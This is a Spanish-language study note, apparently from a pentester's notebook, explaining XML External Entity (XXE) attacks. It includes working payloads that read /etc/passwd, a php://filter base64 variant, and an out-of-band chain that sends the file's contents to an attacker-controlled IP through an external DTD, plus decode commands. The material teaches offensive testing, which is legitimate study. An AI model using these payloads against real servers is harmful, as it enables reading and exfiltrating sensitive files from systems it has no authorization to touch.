tags:
___
Un ataque XXE generalmente implica la inyección de una **entidad** XML maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible. Por ejemplo, un atacante podría inyectar una entidad XML que hace referencia a un archivo en el sistema del servidor y obtener información confidencial de ese archivo.

Un caso común en el que los atacantes pueden explotar XXE es cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe.
Para una comprobación inicial muy básica, podemos usar la siguiente línea para declarar una entidad llamada **myFile** que valga **"file:///etc/passwd"** y luego invocarla en el campo vulnerable, en este caso el email:

### XXE OUT OF BAND (OOB XXE)

```bash
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
```

![Pasted image 20251024021744](../../../Anexos/Pasted%20image%2020251024021744.png)

A veces nos vamos a encontrar con una OBB, en cuyo caso usamos el siguiente código para convertir el contenido del archivo a base64 y así poder verlo:

```bash
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
```

![Pasted image 20251024023352](../../../Anexos/Pasted%20image%2020251024023352.png)

Ahora solo queda hacer un decode en nuestra máquina de atacante para ver el contenido. Podemos crear un archivo que se llame, por ejemplo, hacked.txt y ejecutar lo siguiente:

```bash
cat hacked.txt | base64 -d 
```

Otra forma es hacer la petición a un servidor web de la máquina de atacante al cual haremos la petición con la siguiente línea de código:

```bash
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.70.86/testXXE"> %xxe;]>
```

![Pasted image 20251024025436](../../../Anexos/Pasted%20image%2020251024025436.png)

```bash
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.70.86/?file=%file;'>">
%eval;
%exfil;     
```

![Pasted image 20251024031218](../../../Anexos/Pasted%20image%2020251024031218.png)

![Pasted image 20251024030954](../../../Anexos/Pasted%20image%2020251024030954.png)

Ahora, usamos el siguiente comando para ver el contenido:

```bash
echo "CADENA_BASE64" -n | base64 -d; echo
```

![Pasted image 20251024031121](../../../Anexos/Pasted%20image%2020251024031121.png)
